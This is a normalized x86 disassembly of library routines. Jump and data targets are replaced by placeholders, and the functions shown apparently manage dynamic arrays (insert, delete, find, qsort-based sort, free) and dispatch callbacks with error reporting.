pop ebp
retn
test [ edi + esi * 4 + 0xc4 ] 0x1
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov [ edi + esi * 4 + 0x84 ] 0x0
sub_1001e1a0
mov eax 0x8
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
push 0x143
push r--data
push 0x51
mov esi 0x50
call sub_1001d4c0
mov ebx eax
xor ebp ebp
add esp 0xc
cmp ebx ebp
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov eax [ esp + 0x1c ]
mov [ ebx ] 0x0
cmp eax ebp
mov [ esp + 0x14 ] ebp
jle r-xdata
call sub_10030080
mov edi eax
mov esi [ edi + 0x184 ]
test esi esi
jne r-xdata
lea edx [ esp + 0x1c ]
mov eax [ edi + esi * 4 + 0x84 ]
test eax eax
je r-xdata
mov esi 0xf
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x1c ]
inc eax
cmp eax ecx
mov [ esp + 0x14 ] eax
jl r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ebp ecx
cmp ebp esi
jle r-xdata
mov [ edi + esi * 4 + 0x84 ] ebx
mov [ edi + esi * 4 + 0xc4 ] 0x3
test [ edi + esi * 4 + 0xc4 ] 0x1
je r-xdata
mov edi [ edx + 0x4 ]
add edx 0x4
test edi edi
mov [ esp + 0x10 ] edx
je r-xdata
mov eax [ edx ]
lea ecx [ esi + 0x1 ]
push ecx
push eax
push ebx
call sub_10026810
mov edx [ esp + 0x1c ]
add esp 0xc
lea esi [ ebp + 0x14 ]
push 0x153
push r--data
lea eax [ esi + 0x1 ]
push eax
push ebx
call sub_1001d540
add esp 0x10
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov [ edi + esi * 4 + 0x84 ] 0x0
push ebx
call sub_1001d740
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov edx [ esp + 0x10 ]
mov ebx eax
sub_1001e2e0
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
push 0x7d
push r--data
mov esi [ ebp + 0x10 ]
push 0x14
call sub_1001d4c0
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
retn
push 0x7f
push r--data
push 0x10
call sub_1001d4c0
add esp 0xc
mov [ ebx + 0x4 ] eax
test eax eax
je r-xdata
push ebx
call sub_1001d740
add esp 0x4
xor eax eax
mov ecx [ ebx + 0x4 ]
add eax 0x4
cmp eax 0x10
mov [ eax + ecx - 0x4 ] 0x0
jl r-xdata
mov [ ebx + 0x10 ] esi
mov [ ebx + 0xc ] 0x4
mov [ ebx ] 0x0
mov [ ebx + 0x8 ] 0x0
mov edx [ ebp + 0xc ]
mov eax [ ebx + 0x4 ]
push 0x63
push r--data
shl edx 0x2
push edx
push eax
call sub_1001d540
add esp 0x10
test eax eax
jne r-xdata
mov [ ebx + 0x4 ] eax
mov ecx [ ebp ]
mov [ ebx ] ecx
mov ecx [ ebp ]
mov esi [ ebp + 0x4 ]
push edi
shl ecx 0x2
mov edx ecx
mov edi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ ebx + 0x8 ] eax
mov ecx [ ebp + 0xc ]
mov [ ebx + 0xc ] ecx
mov edx [ ebp + 0x10 ]
pop esi
mov [ ebx + 0x10 ] edx
mov eax ebx
pop ebp
pop ebx
retn
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
sub_1001e3c0
push esi
push 0x7d
push r--data
push 0x14
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push 0x7f
push r--data
push 0x10
call sub_1001d4c0
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
xor eax eax
push esi
call sub_1001d740
add esp 0x4
mov ecx [ esi + 0x4 ]
add eax 0x4
cmp eax 0x10
mov [ ecx + eax - 0x4 ] 0x0
jl r-xdata
mov [ esi + 0x10 ] 0x0
mov [ esi + 0xc ] 0x4
mov [ esi ] 0x0
mov [ esi + 0x8 ] 0x0
mov eax esi
pop esi
retn
sub_1001e440
push esi
push 0x7d
push r--data
push 0x14
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push 0x7f
push r--data
push 0x10
call sub_1001d4c0
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
xor eax eax
push esi
call sub_1001d740
add esp 0x4
mov ecx [ esi + 0x4 ]
add eax 0x4
cmp eax 0x10
mov [ ecx + eax - 0x4 ] 0x0
jl r-xdata
mov edx [ esp + 0x8 ]
mov [ esi + 0xc ] 0x4
mov [ esi + 0x10 ] edx
mov [ esi ] 0x0
mov [ esi + 0x8 ] 0x0
mov eax esi
pop esi
retn
sub_1001e4c0
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov ecx [ esi ]
mov eax [ esi + 0xc ]
inc ecx
cmp eax ecx
jg r-xdata
xor eax eax
pop esi
retn
mov eax [ esi ]
push ebx
mov ebx [ esp + 0x14 ]
cmp ebx eax
jge r-xdata
push 0x96
lea edx [ eax * 8 ]
mov eax [ esi + 0x4 ]
push r--data
push edx
push eax
call sub_1001d540
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ esp + 0x10 ]
pop ebx
mov [ ecx + eax * 4 ] edx
mov eax [ esi ]
inc eax
mov [ esi + 0x8 ] 0x0
mov [ esi ] eax
pop esi
retn
test ebx ebx
jl r-xdata
mov ecx [ esi + 0xc ]
mov [ esi + 0x4 ] eax
shl ecx 0x1
mov [ esi + 0xc ] ecx
pop esi
retn
mov edx [ esi + 0x4 ]
push edi
cmp eax ebx
lea edi [ edx + 0x4 ]
jl r-xdata
mov edx [ esi + 0x4 ]
mov eax [ esp + 0x14 ]
pop edi
mov [ edx + ebx * 4 ] eax
mov eax [ esi ]
inc eax
mov [ esi + 0x8 ] 0x0
mov [ esi ] eax
pop ebx
pop esi
retn
lea ecx [ edi + eax * 4 ]
sub eax ebx
sub edx edi
inc eax
mov edi [ edx + ecx ]
mov [ ecx ] edi
sub ecx 0x4
dec eax
jne r-xdata
sub_1001e570
push ebx
push esi
mov esi [ esp + 0xc ]
xor eax eax
push edi
mov ecx [ esi ]
test ecx ecx
jle r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
mov edi [ esi + 0x4 ]
mov ebx [ esp + 0x14 ]
mov edx edi
test esi esi
je r-xdata
inc eax
add edx 0x4
cmp eax ecx
jl r-xdata
test eax eax
jl r-xdata
cmp [ edx ] ebx
je r-xdata
cmp eax ecx
jge r-xdata
mov edi [ edi + eax * 4 ]
lea edx [ ecx - 0x1 ]
cmp eax edx
je r-xdata
mov eax [ esi ]
dec eax
mov [ esi ] eax
mov eax edi
pop edi
pop esi
pop ebx
retn
jge r-xdata
mov ecx [ esi + 0x4 ]
inc eax
cmp eax edx
mov ebx [ ecx + eax * 4 ]
mov [ ecx + eax * 4 - 0x4 ] ebx
jl r-xdata
sub_1001e5d0
push edi
mov edi [ esp + 0x8 ]
test edi edi
je r-xdata
xor eax eax
pop edi
retn
mov ecx [ esp + 0xc ]
test ecx ecx
jl r-xdata
mov edx [ edi ]
cmp ecx edx
jge r-xdata
mov eax [ edi + 0x4 ]
push esi
lea esi [ edx - 0x1 ]
mov eax [ eax + ecx * 4 ]
cmp ecx esi
je r-xdata
mov ecx [ edi ]
pop esi
dec ecx
mov [ edi ] ecx
pop edi
retn
jge r-xdata
push ebx
mov edx [ edi + 0x4 ]
inc ecx
cmp ecx esi
mov ebx [ edx + ecx * 4 ]
mov [ edx + ecx * 4 - 0x4 ] ebx
jl r-xdata
pop ebx
sub_1001e620
mov edx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
test esi esi
mov [ esp + 0xc ] edx
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
jne r-xdata
or eax 0xffffffff
pop esi
retn
mov ecx [ esi + 0x8 ]
test ecx ecx
jne r-xdata
mov ecx [ esi ]
test ecx ecx
jle r-xdata
mov eax [ esp + 0xc ]
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
push eax
mov eax [ esi ]
push 0x4
push eax
push ecx
call qsort
add esp 0x10
mov [ esi + 0x8 ] 0x1
or eax 0xffffffff
pop esi
retn
mov esi [ esi + 0x4 ]
mov eax [ esi + 0x10 ]
mov edx [ esi ]
push 0x2
push eax
mov eax [ esi + 0x4 ]
push 0x4
push edx
lea ecx [ esp + 0x1c ]
push eax
push ecx
call sub_10023370
add esp 0x18
test eax eax
jne r-xdata
or eax 0xffffffff
pop esi
retn
pop esi
retn
inc eax
add esi 0x4
cmp eax ecx
jl r-xdata
sub eax [ esi + 0x4 ]
sar eax 0x2
or eax 0xffffffff
pop esi
retn
cmp [ esi ] edx
je r-xdata
sub_1001e6e0
mov edx [ esp + 0x4 ]
test edx edx
je r-xdata
xor eax eax
retn
mov ecx [ edx ]
test ecx ecx
jle r-xdata
lea eax [ ecx - 0x1 ]
test eax eax
jl r-xdata
cmp eax ecx
jge r-xdata
mov ecx [ edx + 0x4 ]
mov ecx [ ecx + eax * 4 ]
mov [ edx ] eax
mov eax ecx
retn
sub_1001e710
mov edx [ esp + 0x4 ]
test edx edx
je r-xdata
retn
mov ecx [ edx ]
test ecx ecx
jle r-xdata
push edi
mov edi [ edx + 0x4 ]
xor eax eax
[ edi ]
mov [ edx ] eax
pop edi
sub_1001e730
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
push edi
xor edi edi
test eax eax
jle r-xdata
mov eax [ esi + 0x4 ]
pop edi
test eax eax
je r-xdata
push ebx
mov ebx [ esp + 0x14 ]
push esi
call sub_1001d740
add esp 0x4
push eax
call sub_1001d740
add esp 0x4
mov eax [ esi ]
inc edi
cmp edi eax
jl r-xdata
push eax
call ebx
add esp 0x4
mov eax [ esi + 0x4 ]
mov eax [ eax + edi * 4 ]
test eax eax
je r-xdata
pop ebx
sub_1001e780
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_1001d740
add esp 0x4
push eax
call sub_1001d740
add esp 0x4
sub_1001e7c0
mov ecx [ esp + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
retn
mov eax [ esp + 0x8 ]
test eax eax
jl r-xdata
cmp eax [ ecx ]
jge r-xdata
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax * 4 ]
retn
sub_1001e7e0
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
xor eax eax
retn
mov ecx [ esp + 0x8 ]
test ecx ecx
jl r-xdata
cmp ecx [ eax ]
jge r-xdata
mov edx [ eax + 0x4 ]
mov eax [ esp + 0xc ]
mov [ edx + ecx * 4 ] eax
retn
sub_1001e810
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x8 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ esi ]
mov edx [ esi + 0x4 ]
push eax
push 0x4
push ecx
push edx
call qsort
add esp 0x10
mov [ esi + 0x8 ] 0x1
sub_1001e860
push esi
push 0x171
push r--data
push 0x2
push 0x9
call sub_1001f5b0
mov eax [ rw-data ]
push 0x173
mov esi eax
push r--data
inc eax
push 0x2
push 0xa
mov [ rw-data ] eax
call sub_1001f5b0
add esp 0x20
mov eax esi
pop esi
retn
sub_1001e8a0
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
push sub_1001e950
push eax
call sub_1001ffc0
mov ecx [ rw-data ]
push ecx
call sub_1001fca0
add esp 0xc
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
push esi
push 0x10b
push r--data
push 0x2
push 0x9
mov esi 0x1
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
push 0x10e
push r--data
push 0x2
push 0xa
call sub_1001f5b0
add esp 0x10
test esi esi
pop esi
je r-xdata
push sub_10030070
push sub_1001e940
call sub_1001fbd0
add esp 0x8
mov [ rw-data ] eax
test eax eax
jne r-xdata
retn
xor esi esi
sub_1001e980
mov eax 0xc
call sub_1001d0d0
mov eax [ rw-data ]
push ebx
push esi
push edi
test eax eax
jne r-xdata
mov ebx [ esp + 0x1c ]
push 0x12c
push r--data
push 0x2
push 0x9
mov [ esp + 0x1c ] ebx
call sub_1001f5b0
mov ecx [ rw-data ]
lea eax [ esp + 0x1c ]
push eax
push ecx
call sub_1001ff80
mov esi eax
add esp 0x18
test esi esi
jne r-xdata
push 0x10b
push r--data
push 0x2
push 0x9
mov esi 0x1
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
push 0x141
push r--data
push 0x2
push 0xa
call sub_1001f5b0
add esp 0x10
test esi esi
jne r-xdata
push 0x130
push r--data
push 0xc
call sub_1001d4c0
mov edi eax
add esp 0xc
test edi edi
je r-xdata
push 0x10e
push r--data
push 0x2
push 0xa
call sub_1001f5b0
add esp 0x10
test esi esi
je r-xdata
push sub_10030070
push sub_1001e940
call sub_1001fbd0
add esp 0x8
mov [ rw-data ] eax
test eax eax
jne r-xdata
push 0x14f
push r--data
push 0x14
or ebx 0xffffffff
call sub_1001d4c0
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
push 0x143
push r--data
push 0x41
push 0x69
push 0xf
call sub_1001de60
add esp 0x14
mov [ edi ] ebx
mov [ edi + 0x8 ] esi
call sub_1001e3c0
test eax eax
mov [ edi + 0x4 ] eax
push edi
jne r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
add esp 0xc
retn
xor esi esi
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x28 ]
push 0x15a
mov [ edi ] eax
mov eax [ esp + 0x30 ]
mov [ edi + 0x4 ] ecx
mov ecx [ esp + 0x34 ]
push r--data
push 0x2
push 0x9
mov [ edi + 0x8 ] edx
mov [ edi + 0x10 ] eax
mov [ edi + 0xc ] ecx
call sub_1001f5b0
mov edx [ esi + 0x4 ]
push edx
call sub_1001e7b0
mov ecx [ esi + 0x8 ]
add esp 0x14
cmp eax ecx
jg r-xdata
push 0x152
push r--data
push 0x41
push 0x68
push 0xf
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebx
add esp 0xc
retn
mov edx [ rw-data ]
push edx
call sub_1001fcf0
add esp 0x8
mov esi edi
call sub_1001d740
add esp 0x4
jmp r-xdata
mov ebx [ esi + 0x8 ]
mov eax [ esi + 0x4 ]
push edi
push ebx
lea edx [ ebx + 0x1 ]
push eax
mov [ esi + 0x8 ] edx
call sub_1001e7e0
add esp 0xc
mov eax [ esi + 0x4 ]
push 0x0
push eax
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
push 0x15f
push r--data
push 0x41
push 0x68
push 0xf
call sub_1001de60
push edi
call sub_1001d740
add esp 0x18
jmp r-xdata
mov ecx [ esi + 0x4 ]
push ecx
call sub_1001e7b0
mov ecx [ esi + 0x8 ]
add esp 0x4
cmp eax ecx
jle r-xdata
push 0x167
push r--data
push 0x2
push 0xa
call sub_1001f5b0
add esp 0x10
mov eax ebx
pop edi
pop esi
pop ebx
add esp 0xc
retn
sub_1001ebb0
mov eax 0x10
call sub_1001d0d0
mov eax [ rw-data ]
push ebx
xor ebx ebx
push ebp
push esi
cmp eax ebx
push edi
mov [ esp + 0x10 ] ebx
jne r-xdata
mov ebp [ esp + 0x24 ]
push 0x12c
push r--data
push 0x2
push 0x9
mov [ esp + 0x24 ] ebp
call sub_1001f5b0
mov ecx [ rw-data ]
lea eax [ esp + 0x24 ]
push eax
push ecx
call sub_1001ff80
mov edi eax
add esp 0x18
cmp edi ebx
jne r-xdata
push 0x10b
push r--data
push 0x2
push 0x9
mov esi 0x1
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x10
cmp eax ebx
jne r-xdata
push 0x141
push r--data
push 0x2
push 0xa
call sub_1001f5b0
add esp 0x10
cmp edi ebx
jne r-xdata
push 0x130
push r--data
push 0xc
call sub_1001d4c0
mov esi eax
add esp 0xc
cmp esi ebx
je r-xdata
push 0x10e
push r--data
push 0x2
push 0xa
call sub_1001f5b0
add esp 0x10
cmp esi ebx
je r-xdata
push sub_10030070
push sub_1001e940
call sub_1001fbd0
add esp 0x8
cmp eax ebx
mov [ rw-data ] eax
jne r-xdata
mov ebx [ esp + 0x2c ]
push 0x199
push r--data
push 0x2
push 0x5
mov [ ebx ] 0x0
call sub_1001f5b0
mov eax [ edi + 0x4 ]
push eax
call sub_1001e7b0
mov ebp eax
add esp 0x14
test ebp ebp
jle r-xdata
push 0x143
push r--data
push 0x41
push 0x69
push 0xf
call sub_1001de60
add esp 0x14
mov [ esi ] ebp
mov [ esi + 0x8 ] ebx
call sub_1001e3c0
cmp eax ebx
mov [ esi + 0x4 ] eax
push esi
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10
retn
xor esi esi
push 0x1a4
push r--data
push 0x2
push 0x6
call sub_1001f5b0
add esp 0x10
test ebp ebp
jle r-xdata
push 0x19d
lea ecx [ ebp * 4 ]
push r--data
push ecx
call sub_1001d4c0
add esp 0xc
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
mov edx [ rw-data ]
push edx
call sub_1001fcf0
add esp 0x8
mov edi esi
call sub_1001d740
add esp 0x4
jmp r-xdata
xor esi esi
test ebp ebp
jle r-xdata
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
xor esi esi
test ebp ebp
jle r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov edi [ esp + 0x10 ]
push 0x1a7
push r--data
push 0x41
push 0x6c
push 0xf
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov ebx eax
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x10
retn
push eax
call sub_1001d740
add esp 0x4
inc esi
add edi 0x4
cmp esi ebp
jl r-xdata
mov ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
mov edx [ edi + 0x4 ]
push esi
push edx
call sub_1001e7c0
add esp 0x8
mov [ ebx ] eax
inc esi
add ebx 0x4
cmp esi ebp
jl r-xdata
mov ebx [ esp + 0x2c ]
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov ecx [ edi ]
mov edx [ ecx + 0x4 ]
push edx
mov edx [ ecx ]
push edx
push esi
push ebx
push eax
mov eax [ esp + 0x3c ]
push eax
call [ ecx + 0x8 ]
add esp 0x18
push eax
call sub_1001e7b0
add esp 0x4
cmp esi eax
jl r-xdata
mov eax [ ebx ]
push esi
push eax
call sub_1001e7c0
add esp 0x8
xor eax eax
jmp r-xdata
sub_1001ee20
mov eax 0x18
call sub_1001d0d0
mov eax [ esp + 0x24 ]
push ebx
push ebp
xor ebp ebp
mov ecx [ eax ]
push esi
cmp ecx ebp
push edi
mov [ esp + 0x10 ] ebp
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x18
retn
cmp [ rw-data ] ebp
jne r-xdata
mov ebx [ esp + 0x2c ]
push 0x12c
push r--data
push 0x2
push 0x9
mov [ esp + 0x2c ] ebx
call sub_1001f5b0
mov edx [ rw-data ]
lea ecx [ esp + 0x2c ]
push ecx
push edx
call sub_1001ff80
mov edi eax
add esp 0x18
cmp edi ebp
jne r-xdata
push 0x10b
push r--data
push 0x2
push 0x9
mov esi 0x1
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x10
cmp eax ebp
jne r-xdata
push 0x141
push r--data
push 0x2
push 0xa
call sub_1001f5b0
add esp 0x10
cmp edi ebp
jne r-xdata
push 0x130
push r--data
push 0xc
call sub_1001d4c0
mov esi eax
add esp 0xc
cmp esi ebp
je r-xdata
push 0x10e
push r--data
push 0x2
push 0xa
call sub_1001f5b0
add esp 0x10
cmp esi ebp
je r-xdata
push sub_10030070
push sub_1001e940
call sub_1001fbd0
add esp 0x8
cmp eax ebp
mov [ rw-data ] eax
jne r-xdata
push 0x1c5
push r--data
push 0x2
push 0x5
call sub_1001f5b0
mov ecx [ edi + 0x4 ]
push ecx
call sub_1001e7b0
mov edx [ esp + 0x48 ]
mov ebp eax
mov [ esp + 0x28 ] ebp
mov eax [ edx ]
push eax
call sub_1001e7b0
add esp 0x18
cmp eax ebp
jge r-xdata
push 0x143
push r--data
push 0x41
push 0x69
push 0xf
call sub_1001de60
add esp 0x14
mov [ esi ] ebx
mov [ esi + 0x8 ] ebp
call sub_1001e3c0
cmp eax ebp
mov [ esi + 0x4 ] eax
push esi
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x18
retn
xor esi esi
test ebp ebp
jle r-xdata
mov [ esp + 0x14 ] eax
mov ebp eax
mov eax [ rw-data ]
push eax
call sub_1001fcf0
add esp 0x8
mov edi esi
call sub_1001d740
add esp 0x4
jmp r-xdata
push 0x1d3
push r--data
push 0x2
push 0x6
call sub_1001f5b0
mov eax [ esp + 0x20 ]
add esp 0x10
test ebp ebp
jle r-xdata
push 0x1cc
lea ecx [ ebp * 4 ]
push r--data
push ecx
call sub_1001d4c0
add esp 0xc
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
xor edi edi
test ebp ebp
jle r-xdata
test eax eax
jne r-xdata
xor esi esi
test ebp ebp
jle r-xdata
test eax eax
je r-xdata
mov ebx [ esp + 0x30 ]
mov [ esp + 0x2c ] eax
push 0x1d6
push r--data
push 0x41
push 0x6a
push 0xf
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
mov ebx eax
push eax
call sub_1001d740
add esp 0x4
mov ecx [ esp + 0x2c ]
mov [ esp + 0x18 ] eax
mov eax [ ecx ]
test eax eax
je r-xdata
push eax
call sub_1001e7b0
add esp 0x4
cmp edi eax
jl r-xdata
mov edx [ edi + 0x4 ]
push esi
push edx
call sub_1001e7c0
add esp 0x8
mov [ ebx ] eax
inc esi
add ebx 0x4
cmp esi ebp
jl r-xdata
mov eax [ ebx ]
mov ebp [ esp + 0x18 ]
test eax eax
jne r-xdata
mov ecx [ eax + 0x10 ]
test ecx ecx
je r-xdata
mov eax [ esi ]
push edi
push eax
call sub_1001e7c0
add esp 0x8
xor eax eax
jmp r-xdata
mov eax [ ebx ]
push eax
call sub_1001e7b0
mov esi eax
add esp 0x4
cmp esi edi
jg r-xdata
call sub_1001e3c0
test eax eax
mov [ ebx ] eax
jne r-xdata
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push edx
push eax
lea edx [ esp + 0x20 ]
push edi
push edx
push esi
push ebx
call ecx
add esp 0x18
mov edx [ ebx ]
push ebp
push edi
push edx
call sub_1001e7e0
add esp 0xc
mov ecx [ ebx ]
push 0x0
push ecx
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
push 0x259
jmp r-xdata
mov esi [ esp + 0x34 ]
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
push 0x263
inc esi
cmp esi edi
jle r-xdata
push r--data
push 0x41
push 0x66
push 0xf
call sub_1001de60
add esp 0x14
jmp r-xdata
mov ecx [ esp + 0x2c ]
mov eax [ esp + 0x14 ]
inc edi
add ecx 0x4
cmp edi eax
mov [ esp + 0x2c ] ecx
jl r-xdata
sub_1001f130
mov eax 0x10
call sub_1001d0d0
mov eax [ rw-data ]
push ebx
push ebp
xor ebp ebp
push esi
cmp eax ebp
push edi
mov [ esp + 0x10 ] ebp
jne r-xdata
mov ebx [ esp + 0x24 ]
push 0x12c
push r--data
push 0x2
push 0x9
mov [ esp + 0x24 ] ebx
call sub_1001f5b0
mov ecx [ rw-data ]
lea eax [ esp + 0x24 ]
push eax
push ecx
call sub_1001ff80
mov edi eax
add esp 0x18
cmp edi ebp
jne r-xdata
push 0x10b
push r--data
push 0x2
push 0x9
mov esi 0x1
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x10
cmp eax ebp
jne r-xdata
push 0x141
push r--data
push 0x2
push 0xa
call sub_1001f5b0
add esp 0x10
cmp edi ebp
jne r-xdata
push 0x130
push r--data
push 0xc
call sub_1001d4c0
mov esi eax
add esp 0xc
cmp esi ebp
je r-xdata
push 0x10e
push r--data
push 0x2
push 0xa
call sub_1001f5b0
add esp 0x10
cmp esi ebp
je r-xdata
push sub_10030070
push sub_1001e940
call sub_1001fbd0
add esp 0x8
cmp eax ebp
mov [ rw-data ] eax
jne r-xdata
push 0x1f0
push r--data
push 0x2
push 0x5
call sub_1001f5b0
mov eax [ edi + 0x4 ]
push eax
call sub_1001e7b0
mov ebp eax
add esp 0x14
test ebp ebp
jle r-xdata
push 0x143
push r--data
push 0x41
push 0x69
push 0xf
call sub_1001de60
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov [ esi ] ebx
mov [ esi + 0x8 ] ebp
call sub_1001e3c0
cmp eax ebp
mov [ esi + 0x4 ] eax
push esi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
xor esi esi
push 0x1fb
push r--data
push 0x2
push 0x6
call sub_1001f5b0
add esp 0x10
test ebp ebp
jle r-xdata
push 0x1f4
lea ecx [ ebp * 4 ]
push r--data
push ecx
call sub_1001d4c0
add esp 0xc
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
mov edx [ rw-data ]
push edx
call sub_1001fcf0
add esp 0x8
mov edi esi
call sub_1001d740
add esp 0x4
jmp r-xdata
mov ebx [ esp + 0x2c ]
xor esi esi
test ebp ebp
jle r-xdata
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
xor esi esi
test ebp ebp
jle r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov edi [ esp + 0x10 ]
push 0x1fe
push r--data
push 0x41
push 0x6b
push 0xf
call sub_1001de60
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov ebx eax
mov eax [ ebx ]
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
inc esi
add edi 0x4
cmp esi ebp
jl r-xdata
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov edx [ edi + 0x4 ]
push esi
push edx
call sub_1001e7c0
add esp 0x8
mov [ ebx ] eax
inc esi
add ebx 0x4
cmp esi ebp
jl r-xdata
push eax
call sub_1001e780
add esp 0x4
mov [ ebx ] 0x0
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov ecx [ edi ]
mov edx [ ecx + 0x4 ]
push edx
mov edx [ ecx ]
push edx
push esi
push ebx
push eax
mov eax [ esp + 0x3c ]
push eax
call [ ecx + 0xc ]
add esp 0x18
push eax
call sub_1001e7b0
add esp 0x4
cmp esi eax
jl r-xdata
mov eax [ ebx ]
push esi
push eax
call sub_1001e7c0
add esp 0x8
xor eax eax
jmp r-xdata
sub_1001f3a0
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
mov edx [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
push ecx
push edx
call [ eax + 0x8 ]
add esp 0x18
retn
push 0xcb
push r--data
push 0x2
push 0x9
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
push 0xce
push r--data
push 0x2
push 0xa
call sub_1001f5b0
add esp 0x10
mov [ rw-data ] rw-data
sub_1001f420
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
mov eax [ rw-data ]
push ecx
push edx
call [ eax + 0xc ]
add esp 0xc
retn
push 0xcb
push r--data
push 0x2
push 0x9
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
push 0xce
push r--data
push 0x2
push 0xa
call sub_1001f5b0
add esp 0x10
mov [ rw-data ] rw-data
sub_1001f490
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
mov eax [ rw-data ]
push ecx
push edx
call [ eax + 0x14 ]
add esp 0xc
retn
push 0xcb
push r--data
push 0x2
push 0x9
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
push 0xce
push r--data
push 0x2
push 0xa
call sub_1001f5b0
add esp 0x10
mov [ rw-data ] rw-data
sub_1001f500
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
push eax
call sub_1001e7b0
mov ebx [ esp + 0x18 ]
mov esi eax
add esp 0x4
cmp esi ebx
jg r-xdata
call sub_1001e3c0
test eax eax
mov [ edi ] eax
jne r-xdata
mov edx [ esp + 0x18 ]
mov eax [ edi ]
push edx
push ebx
push eax
call sub_1001e7e0
add esp 0xc
mov eax 0x1
pop edi
pop esi
pop ebx
retn
mov ecx [ edi ]
push 0x0
push ecx
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
push 0x259
jmp r-xdata
push 0x263
inc esi
cmp esi ebx
jle r-xdata
push r--data
push 0x41
push 0x66
push 0xf
call sub_1001de60
